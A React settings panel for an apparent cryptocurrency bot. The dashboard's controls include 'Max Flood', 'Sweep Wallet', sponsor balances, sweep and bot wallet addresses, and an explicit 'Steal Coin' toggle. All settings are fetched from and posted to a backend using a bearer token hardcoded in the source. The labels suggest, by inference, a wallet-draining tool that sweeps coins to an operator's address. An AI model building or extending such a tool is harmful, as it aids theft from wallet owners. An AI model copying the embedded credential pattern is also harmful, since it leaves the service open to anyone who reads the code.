import React, { useEffect, useState } from 'react'
import { motion } from "framer-motion";
import { Card, CardContent } from './ui/card';
import { Input } from './ui/input';
import { Button } from './ui/button';
import { Settings } from "lucide-react";

function SettingsTab() {
    const [maxFlood, setMaxFlood] = useState('2');
    const [feeType, setFeeType] = useState("Base Fee");
    const [sweep, setSweep] = useState(true);
    const [useAllSponsors, setUseAllSponsors] = useState(true);
    const [steal, setSteal] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [fee, setFee] = useState('0.02')
    const [minSponsorBalance, setMinSponsorBalance] = useState('0.02');
    const [botAddress, setBotAddress] = useState('');
    const [sweepAddress, setSweepAddress] = useState('');
    const API = import.meta.env.VITE_API_URL;

    async function getSettings() {
        const res = await fetch(`${API}/settings/whoami5677`, {
            method: 'GET',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            }
        });
        const json = await res.json();
        if(json) {
            setMaxFlood(json.maxFlood);
            if(json.fee !== 'Base Fee') {
                setFeeType('Custom Fee');
                setFee(json.fee)
            }
            setSweep(json.sweep);
            setSweepAddress(json.sweepAddress);
            setSteal(json.steal);
            setBotAddress(json.botAddress);
            setMinSponsorBalance(json.minSponsorBalance);
            setUseAllSponsors(json.useAllSponsors);
        }
        
    }

    useEffect(() => {
        try{
            getSettings()
        } catch(err) {
            console.log(err)
        }
    }, []);

    async function handleUpdateSettings() {
        setIsLoading(true);
        const res = await fetch(`${API}/settings`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': 'Bearer hfhryeujhshbxhdsjjskaas',
            },
            body: JSON.stringify({ 
                maxFlood,
                name: 'whoami5677',
                fee: feeType == 'Base Fee' ? 'Base Fee' : fee,
                sweep,
                steal,
                sweepAddress,
                botAddress,
                minSponsorBalance,
                useAllSponsors

            }),
        });
        alert('Settings updated!')
        setIsLoading(false);
    }
      
    return (
        <motion.section initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="mt-4">
            <Card className="rounded-2xl border-indigo-900/40 bg-white/5">
                <CardContent className="p-4 sm:p-6">
                    <h2 className="mb-4 flex items-center gap-2 text-lg font-semibold text-gray-200">
                        <Settings className="h-5 w-5 text-indigo-300" /> Bot Settings
                    </h2>
                    <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                        <div>
                            <label className="mb-1 block text-sm text-white">Max Flood</label>
                            <Input
                                onChange={(e) => setMaxFlood(e.target.value)}
                                value={maxFlood}
                                type="number"
                                placeholder="e.g. 100" 
                                className="rounded-xl bg-white/5 outline-none ring-0 focus-visible:ring-0 text-white" 
                            />
                        </div>

                        <div>
                            <label className="mb-1 block text-sm text-white">Min Sponsor Balance</label>
                            <Input
                                onChange={(e) => setMinSponsorBalance(e.target.value)}
                                value={minSponsorBalance}
                                type="number"
                                placeholder="e.g. 100" 
                                className="rounded-xl bg-white/5 outline-none ring-0 focus-visible:ring-0 text-white" 
                            />
                        </div>
                        
                        <div>
                            <label className="mb-1 block text-sm text-white">Fee Type</label>
                            <select
                                onChange={(e) => setFeeType(e.target.value)}
                                value={feeType}
                                className="w-full rounded-xl border border-indigo-900/40 bg-white/5 text-white outline-none p-2"
                            >
                                <option value="Custom Fee">Custom Fee</option>
                                <option value="Base Fee">Base Fee</option>
                            </select>
                        </div>

                        {
                            feeType === 'Custom Fee' && 
                            <div>
                                <label className="mb-1 block text-sm text-white">Custom Fee</label>
                                <Input 
                                    placeholder="e.g. 1" 
                                    className="rounded-xl bg-white/5 outline-none ring-0 focus-visible:ring-0 text-white"
                                    onChange={(e) => setFee(e.target.value)}
                                    value={fee}
                                    type="number"
                                />
                            </div>
                        }

                        <div>
                            <label className="mb-1 block text-sm text-white">Sweep Wallet</label>
                            <select
                                value={sweep ? "Always" : "Never"}
                                onChange={(e) => setSweep(e.target.value === "Always")}
                                className="w-full rounded-xl border border-indigo-900/40 bg-white/5 text-white p-2 outline-none"
                            >
                                <option value="Always">Always</option>
                                <option value="Never">Never</option>
                            </select>
                        </div>

                        <div>
                            <label className="mb-1 block text-sm text-white">Use All Sponsors</label>
                            <select
                                value={useAllSponsors ? "Yes" : "No"}
                                onChange={(e) => setUseAllSponsors(e.target.value === "Yes")}
                                className="w-full rounded-xl border border-indigo-900/40 bg-white/5 text-white p-2 outline-none"
                            >
                                <option value="Yes">Yes</option>
                                <option value="No">No</option>
                            </select>
                        </div>

                        <div>
                            <label className="mb-1 block text-sm text-white">Steal Coin</label>
                            <select
                                value={steal ? "Yes" : "No"}
                                onChange={(e) => setSteal(e.target.value === "Yes")}
                                className="w-full rounded-xl border border-indigo-900/40 bg-white/5 text-white p-2 outline-none"
                            >
                                <option value="Yes">Yes</option>
                                <option value="No">No</option>
                            </select>
                        </div>

                        <div>
                            <label className="mb-1 block text-sm text-white">Sweep Address</label>
                            <Input
                                placeholder="Wallet address" 
                                className="rounded-xl bg-white/5 outline-none border-none focus-visible:ring-0 text-white ring-0"
                                onChange={(e) => setSweepAddress(e.target.value)}
                                value={sweepAddress}
                            />
                        </div>

                        <div>
                            <label className="mb-1 block text-sm text-white">Bot Address</label>
                            <Input
                                placeholder="Wallet address" 
                                className="rounded-xl bg-white/5 outline-none border-none focus-visible:ring-0 text-white ring-0"
                                onChange={(e) => setBotAddress(e.target.value)}
                                value={botAddress}
                            />
                        </div>
                    </div>
                    <Button
                        onClick={handleUpdateSettings}
                        disabled={isLoading}
                        className={`mt-4 rounded-xl px-3 text-xs py-1 font-semibold transition ${
                        isLoading
                            ? "bg-indigo-400 opacity-70 cursor-not-allowed"
                            : "bg-indigo-600 hover:bg-indigo-500"
                        }`}
                    >
                        Save Settings
                    </Button>
                </CardContent>
            </Card>
        </motion.section>
    );
}

export default SettingsTab